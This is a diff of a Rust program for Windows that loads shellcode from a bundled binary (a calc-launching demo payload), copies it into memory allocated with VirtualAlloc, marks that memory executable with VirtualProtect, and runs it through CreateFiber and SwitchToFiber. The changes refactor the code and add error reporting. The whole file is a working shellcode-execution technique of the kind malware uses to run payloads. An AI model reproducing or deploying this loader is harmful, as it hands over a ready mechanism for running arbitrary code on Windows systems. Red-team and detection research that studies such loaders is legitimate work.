@@ -2,39 +2,44 @@
 
 use std::mem::transmute;
 use std::ptr::{copy, null};
-use windows_sys::Win32::Foundation::FALSE;
+use windows_sys::Win32::Foundation::{GetLastError, FALSE};
 use windows_sys::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
 
-const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-const SIZE: usize = SHELLCODE.len();
-
 #[cfg(target_os = "windows")]
 fn main() {
-    let mut old = PAGE_READWRITE;
+    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+    let shellcode_size = shellcode.len();
+
     unsafe {
         let main_fiber = ConvertThreadToFiber(null());
         if main_fiber.is_null() {
-            panic!("ConvertThreadToFiber failed!");
+            panic!("[-]ConvertThreadToFiber failed: {}!", GetLastError());
         }
 
-        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if dest.is_null() {
-            panic!("VirtualAlloc failed!");
+        let addr = VirtualAlloc(
+            null(),
+            shellcode_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+        if addr.is_null() {
+            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
         }
 
-        copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
-        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
+        let mut old = PAGE_READWRITE;
+        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);
+        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            panic!("VirtualProtect failed!");
+            panic!("[-]VirtualProtect failed: {}!", GetLastError());
         }
 
-        let dest = transmute(dest);
-        let fiber = CreateFiber(0, dest, null());
+        let func = transmute(addr);
+        let fiber = CreateFiber(0, func, null());
         if fiber.is_null() {
-            panic!("CreateFiber failed!");
+            panic!("[-]CreateFiber failed: {}!", GetLastError());
         }
 
         SwitchToFiber(fiber);
